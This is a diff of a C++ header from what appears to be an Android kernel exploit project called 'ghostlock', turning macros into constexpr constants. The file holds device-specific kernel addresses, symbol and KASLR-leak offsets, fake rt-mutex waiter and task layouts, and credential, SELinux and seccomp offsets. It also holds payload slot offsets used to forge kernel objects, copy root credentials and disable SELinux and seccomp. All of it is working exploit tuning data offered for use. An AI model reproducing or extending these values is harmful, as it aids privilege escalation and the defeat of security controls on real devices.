@@ -3,143 +3,142 @@
 
 #include "target_constants.hpp"
 
-#define BUILD_VARIANT_LABEL "ghostlock_oplus"
+/* Compiled-in target geometry, functionized into ghostlock::kernel.
+ *
+ * The values fall into three groups: address-layout and payload-slot values
+ * forwarded from target_constants.hpp, device/profile defaults, and the
+ * symbol/slide/struct offsets that the profile may override through the
+ * runtime_struct_offsets.h accessors. Nothing here is a second authority; a
+ * resolved profile still wins wherever a value is optional. */
 
-/* Compatibility façade for the translation units that still read C-style
- * macros. `target_constants.hpp` owns the stable address-domain and
- * payload-slot values for C++ code; everything below is a retained default or
- * fallback, not a second authority:
- *
- *   - device/profile defaults (`P0_KERNEL_PHYS_LOAD`, `QC_GKI_6_12_PHYS_LOAD`,
- *     `XRING_KERNEL_PHYS_LOAD`): delete in CPP08/CPP12, once RuntimeConfig owns
- *     the startup fallback and ExploitSession is the only entry point.
- *   - symbol/slide and fake-layout offsets: fallbacks for the `_RSO`
- *     accessors in `runtime_struct_offsets.h`. They are still reachable when a
- *     resolved profile carries zero for an unchecked field, so they are deleted
- *     in CPP08 only after profile validation forces every symbol field nonzero.
- *   - payload slots already forwarded from `target_constants.hpp`
- *     (`LOCK_OFF`, `W0_OFF`, `FOPS_OFF`, `RIGHT_OFF`, `LEFT_OFF`,
- *     `FAKE_TASK_OFF`, `CRED_COPY_OFF`, `TCP_*`): keep this C-compatible
- *     spelling until CPP05/CPP13 replace the remaining payload readers.
- *   - kernel structure layout offsets (`FAKE_WAITER_*`, `TASK_*`, `CRED_*`,
- *     `SECCOMP_*`, `STRUCT_*`): move into the payload/kernel layout constant
- *     namespace in CPP05/CPP13.
- *
- * `tests/target_constants_test.cpp` pins every value so an accidental change
- * is caught before it can alter the payload bytes.
- */
+namespace ghostlock::kernel {
+
+inline constexpr const char *BUILD_VARIANT_LABEL = "ghostlock_oplus";
 
 /* Kernel address layout. */
-#define KIMAGE_TEXT_BASE (::ghostlock::target::address::kImageTextBase)
-#define MTK_VADDR_BASE (::ghostlock::target::address::kMtkVirtualBase)
-#define P0_PAGE_OFFSET (::ghostlock::target::address::kPageOffset)
-#define P0_PHYS_OFFSET (::ghostlock::target::address::kPhysicalOffset)
-#define KERNELSNITCH_IDENTITY_START \
-  (::ghostlock::target::address::kKernelSnitchIdentityStart)
-#define KERNELSNITCH_IDENTITY_END \
-  (::ghostlock::target::address::kKernelSnitchIdentityEnd)
-#define DIRECT_MAP_BASE (::ghostlock::target::address::kDirectMapBase)
-#define DIRECT_MAP_END (::ghostlock::target::address::kDirectMapEnd)
-#define VMEMMAP_START (::ghostlock::target::address::kVmemmapStart)
+inline constexpr std::uintptr_t KIMAGE_TEXT_BASE = target::address::kImageTextBase;
+inline constexpr std::uintptr_t MTK_VADDR_BASE = target::address::kMtkVirtualBase;
+inline constexpr std::uintptr_t P0_PAGE_OFFSET = target::address::kPageOffset;
+inline constexpr std::uintptr_t P0_PHYS_OFFSET = target::address::kPhysicalOffset;
+inline constexpr std::uintptr_t KERNELSNITCH_IDENTITY_START =
+        target::address::kKernelSnitchIdentityStart;
+inline constexpr std::uintptr_t KERNELSNITCH_IDENTITY_END =
+        target::address::kKernelSnitchIdentityEnd;
+inline constexpr std::uintptr_t DIRECT_MAP_BASE = target::address::kDirectMapBase;
+inline constexpr std::uintptr_t DIRECT_MAP_END = target::address::kDirectMapEnd;
+inline constexpr std::uintptr_t VMEMMAP_START = target::address::kVmemmapStart;
 
-/* Device/profile defaults remain in the C compatibility layer. */
-#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
-#define QC_GKI_6_12_PHYS_LOAD 0xc7800000ULL
-#define XRING_KERNEL_PHYS_LOAD 0x80200000ULL
+/* Device/profile defaults. */
+inline constexpr unsigned long long P0_KERNEL_PHYS_LOAD = 0xa8000000ULL;
+inline constexpr unsigned long long QC_GKI_6_12_PHYS_LOAD = 0xc7800000ULL;
+inline constexpr unsigned long long XRING_KERNEL_PHYS_LOAD = 0x80200000ULL;
 
 /* Symbol offsets. */
-#define INIT_TASK_OFF 0x0211e280ULL
-#define INIT_CRED_OFF 0x02130748ULL
-#define ROOT_TASK_GROUP_OFF 0x02317580ULL
-#define SELINUX_ENFORCING_OFF 0x02358ee0ULL
-#define SELINUX_BLOB_SIZES_OFF 0x0167b5d0ULL
-#define SECURITY_HOOK_HEADS_OFF 0x00000000ULL
+inline constexpr unsigned long long INIT_TASK_OFF = 0x0211e280ULL;
+inline constexpr unsigned long long INIT_CRED_OFF = 0x02130748ULL;
+inline constexpr unsigned long long ROOT_TASK_GROUP_OFF = 0x02317580ULL;
+inline constexpr unsigned long long SELINUX_ENFORCING_OFF = 0x02358ee0ULL;
+inline constexpr unsigned long long SELINUX_BLOB_SIZES_OFF = 0x0167b5d0ULL;
+inline constexpr unsigned long long SECURITY_HOOK_HEADS_OFF = 0x00000000ULL;
 
 /* KASLR leak symbols. */
-#define SLIDE_NFULNL_LOGGER_OFF 0x02112260ULL
-#define SLIDE_LOGGERS_0_1_OFF 0x021121b0ULL
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02379ed8ULL
-#define SLIDE_SYSCTL_BOOTID_OFF 0x02379ed8ULL
+inline constexpr unsigned long long SLIDE_NFULNL_LOGGER_OFF = 0x02112260ULL;
+inline constexpr unsigned long long SLIDE_LOGGERS_0_1_OFF = 0x021121b0ULL;
+inline constexpr unsigned long long SLIDE_RANDOM_BOOT_ID_DATA_OFF = 0x02379ed8ULL;
+inline constexpr unsigned long long SLIDE_SYSCTL_BOOTID_OFF = 0x02379ed8ULL;
 
 /* Kernel addresses. */
-#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
-#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
-#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
-#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
-#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
-#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
-#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
-#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
-#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
-#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
-#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
-#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
+inline constexpr unsigned long long INIT_TASK = KIMAGE_TEXT_BASE + INIT_TASK_OFF;
+inline constexpr unsigned long long INIT_CRED = KIMAGE_TEXT_BASE + INIT_CRED_OFF;
+inline constexpr unsigned long long ROOT_TASK_GROUP =
+        KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF;
+inline constexpr unsigned long long SELINUX_ENFORCING =
+        KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF;
+inline constexpr unsigned long long SELINUX_BLOB_SIZES =
+        KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF;
+inline constexpr unsigned long long SECURITY_HOOK_HEADS =
+        KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF;
+inline constexpr unsigned long long SLIDE_NFULNL_LOGGER_IMAGE =
+        KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF;
+inline constexpr unsigned long long SLIDE_LOGGERS_0_1_IMAGE =
+        KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF;
+inline constexpr unsigned long long SLIDE_RANDOM_BOOT_ID_DATA_IMAGE =
+        KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF;
+inline constexpr unsigned long long SLIDE_INIT_TASK_IMAGE =
+        KIMAGE_TEXT_BASE + INIT_TASK_OFF;
+inline constexpr unsigned long long SLIDE_ROOT_TASK_GROUP_IMAGE =
+        KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF;
+inline constexpr unsigned long long SLIDE_SYSCTL_BOOTID_IMAGE =
+        KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF;
 
-#define PSELECT_WAITER_WORD_SHIFT (-2)
+inline constexpr int PSELECT_WAITER_WORD_SHIFT = -2;
 
 /* Fake waiter and task layouts. */
-#define FAKE_WAITER_TREE_PRIO_OFF 0x18
-#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
-#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
-#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
-#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
-#define FAKE_WAITER_TASK_OFF 0x50
-#define FAKE_WAITER_LOCK_OFF 0x58
-#define FAKE_WAITER_WAKE_STATE_OFF 0x60
-#define FAKE_WAITER_WW_CTX_OFF 0x68
+inline constexpr int FAKE_WAITER_TREE_PRIO_OFF = 0x18;
+inline constexpr int FAKE_WAITER_TREE_DEADLINE_OFF = 0x20;
+inline constexpr int FAKE_WAITER_PI_TREE_ENTRY_OFF = 0x28;
+inline constexpr int FAKE_WAITER_PI_TREE_PRIO_OFF = 0x40;
+inline constexpr int FAKE_WAITER_PI_TREE_DEADLINE_OFF = 0x48;
+inline constexpr int FAKE_WAITER_TASK_OFF = 0x50;
+inline constexpr int FAKE_WAITER_LOCK_OFF = 0x58;
+inline constexpr int FAKE_WAITER_WAKE_STATE_OFF = 0x60;
+inline constexpr int FAKE_WAITER_WW_CTX_OFF = 0x68;
 
-#define FAKE_TASK_USAGE_OFF 0x40
-#define FAKE_TASK_PRIO_OFF 0x84
-#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
-#define FAKE_TASK_TASK_GROUP_OFF 0x348
-#define FAKE_TASK_PI_LOCK_OFF 0x90c
-#define FAKE_TASK_PI_WAITERS_OFF 0x920
-#define FAKE_TASK_PI_TOP_TASK_OFF 0x930
-#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938
+inline constexpr int FAKE_TASK_USAGE_OFF = 0x40;
+inline constexpr int FAKE_TASK_PRIO_OFF = 0x84;
+inline constexpr int FAKE_TASK_NORMAL_PRIO_OFF = 0x8c;
+inline constexpr int FAKE_TASK_TASK_GROUP_OFF = 0x348;
+inline constexpr int FAKE_TASK_PI_LOCK_OFF = 0x90c;
+inline constexpr int FAKE_TASK_PI_WAITERS_OFF = 0x920;
+inline constexpr int FAKE_TASK_PI_TOP_TASK_OFF = 0x930;
+inline constexpr int FAKE_TASK_PI_BLOCKED_ON_OFF = 0x938;
 
-#define TASK_PID_OFF 0x618
-#define TASK_TGID_OFF 0x61c
-#define TASK_ATOMIC_FLAGS_OFF 0x5d8
-#define TASK_REAL_CRED_OFF 0x818
-#define TASK_CRED_OFF 0x820
-#define TASK_COMM_OFF 0x830
-#define TASK_TASKS_OFF 0x550
-#define TASK_THREAD_INFO_FLAGS_OFF 0x00
-#define TASK_SECCOMP_OFF 0x8e8
+inline constexpr int TASK_PID_OFF = 0x618;
+inline constexpr int TASK_TGID_OFF = 0x61c;
+inline constexpr int TASK_ATOMIC_FLAGS_OFF = 0x5d8;
+inline constexpr int TASK_REAL_CRED_OFF = 0x818;
+inline constexpr int TASK_CRED_OFF = 0x820;
+inline constexpr int TASK_COMM_OFF = 0x830;
+inline constexpr int TASK_TASKS_OFF = 0x550;
+inline constexpr int TASK_THREAD_INFO_FLAGS_OFF = 0x00;
+inline constexpr int TASK_SECCOMP_OFF = 0x8e8;
 
-#define CRED_UID_OFF 8
-#define CRED_SECUREBITS_OFF 40
-#define CRED_CAPS_OFF 48
-#define CRED_SECURITY_OFF 128
-#define SELINUX_CRED_BLOB_OFF 0
-#define SELINUX_CRED_OSID_OFF 0
-#define SELINUX_CRED_SID_OFF 4
-#define SECCOMP_MODE_OFF 0x00
-#define SECCOMP_FILTER_COUNT_OFF 0x04
-#define SECCOMP_FILTER_OFF 0x08
-#define TIF_SECCOMP_BIT 11
-#define PFA_NO_NEW_PRIVS_BIT 0
+inline constexpr int CRED_UID_OFF = 8;
+inline constexpr int CRED_SECUREBITS_OFF = 40;
+inline constexpr int CRED_CAPS_OFF = 48;
+inline constexpr int CRED_SECURITY_OFF = 128;
+inline constexpr int SELINUX_CRED_BLOB_OFF = 0;
+inline constexpr int SELINUX_CRED_OSID_OFF = 0;
+inline constexpr int SELINUX_CRED_SID_OFF = 4;
+inline constexpr int SECCOMP_MODE_OFF = 0x00;
+inline constexpr int SECCOMP_FILTER_COUNT_OFF = 0x04;
+inline constexpr int SECCOMP_FILTER_OFF = 0x08;
+inline constexpr int TIF_SECCOMP_BIT = 11;
+inline constexpr int PFA_NO_NEW_PRIVS_BIT = 0;
 
-#define STRUCT_PAGE_SIZE 0x40
-#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
-#define STRUCT_SLAB_CACHE_OFF 0x08
-#define STRUCT_PAGE_TYPE_OFF 0x30
+inline constexpr int STRUCT_PAGE_SIZE = 0x40;
+inline constexpr int STRUCT_PAGE_COMPOUND_HEAD_OFF = 0x08;
+inline constexpr int STRUCT_SLAB_CACHE_OFF = 0x08;
+inline constexpr int STRUCT_PAGE_TYPE_OFF = 0x30;
 
-#define LOCK_OFF (::ghostlock::target::payload::kLockOffset)
-#define W0_OFF (::ghostlock::target::payload::kWaiterOffset)
-#define FOPS_OFF (::ghostlock::target::payload::kFileOperationsOffset)
-#define RIGHT_OFF (::ghostlock::target::payload::kRightNodeOffset)
-#define LEFT_OFF (::ghostlock::target::payload::kLeftNodeOffset)
-#define FAKE_TASK_OFF (::ghostlock::target::payload::kFakeTaskOffset)
+inline constexpr std::size_t LOCK_OFF = target::payload::kLockOffset;
+inline constexpr std::size_t W0_OFF = target::payload::kWaiterOffset;
+inline constexpr std::size_t FOPS_OFF = target::payload::kFileOperationsOffset;
+inline constexpr std::size_t RIGHT_OFF = target::payload::kRightNodeOffset;
+inline constexpr std::size_t LEFT_OFF = target::payload::kLeftNodeOffset;
+inline constexpr std::size_t FAKE_TASK_OFF = target::payload::kFakeTaskOffset;
 
 /* W2 payload. */
-#define CRED_COPY_OFF (::ghostlock::target::payload::kCredentialCopyOffset)
+inline constexpr std::size_t CRED_COPY_OFF = target::payload::kCredentialCopyOffset;
 
 /* TCP zerocopy payload offsets: fake_task sits at 0x5800 so it clears the
  * fake_lock rb_leftmost zone; the cred copy follows because the pselect
  * 0x1080 slot would land inside fake_task. */
-#define TCP_FAKE_TASK_OFF (::ghostlock::target::payload::kTcpFakeTaskOffset)
-#define TCP_CRED_COPY_OFF \
-  (::ghostlock::target::payload::kTcpCredentialCopyOffset)
+inline constexpr std::size_t TCP_FAKE_TASK_OFF =
+        target::payload::kTcpFakeTaskOffset;
+inline constexpr std::size_t TCP_CRED_COPY_OFF =
+        target::payload::kTcpCredentialCopyOffset;
+
+} // namespace ghostlock::kernel
 
 #endif
